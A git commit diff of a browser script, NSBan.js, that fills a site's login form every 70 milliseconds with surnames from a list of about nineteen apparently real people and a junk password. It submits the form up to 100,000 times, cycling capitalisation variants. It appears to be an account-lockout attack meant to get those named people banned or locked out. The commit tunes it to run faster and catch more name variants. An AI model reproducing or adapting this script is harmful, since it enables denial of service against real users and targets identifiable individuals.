ba2d0cc3639a575751574c24bcacce084cd2b365
Наташенька ❤️ <evilberry@icloud.com>
2017-04-20 22:59:41 +0700

    Update NSBan.js

--- NSBan.js
+++ NSBan.js
@@ -23,12 +23,14 @@ run();
 
 
 // HARD
-var array = ["Аплин","Симонов","Фатеева","Анисимова","Богданов","Беляева","Картавых","Братчикова","Латыпов","Малышков","Толстошеев","Носарева","Рогозин","Рахлевский","Белькевич","Селявский","Будунов","Шестакова", "Дубская"];
+var array = ["аплин","симонов","фатеева","анисимова","богданов","беляева","картавых","братчикова","латыпов","малышков","толстошеев","носарева","рогозин","рахлевский","белькевич","селявский","будунов","шестакова", "дубская"];
 function run(){
     var x = 0;
     var n = 0;
+    var r = 0;
+    var now = array[0];
     var interval = setInterval(function() {
-      document.getElementsByName('UN')[0].value = array[x];
+      document.getElementsByName('UN')[0].value = now;
       document.getElementsByName('PW')[0].value = "рандомныйпароль"
       login_ctrl.login();
       if (x >= 100000) {
@@ -36,15 +38,23 @@ function run(){
       }
       n++;
       if(n <= 4){
+        now = array[x];
         n++;
       }else{
-        x++;
-        n = 0;
+        if(r <= 4){
+          now = now.charAt(0).toUpperCase() + now.substr(1);
+          r++;
+        }else{
+          x++;
+          r = 0;
+          n = 0;
+        }
       }
       if(x == 18){
         x = 0;
       }
-    }, 100);
+    }, 70);
 }
 run();
+
 
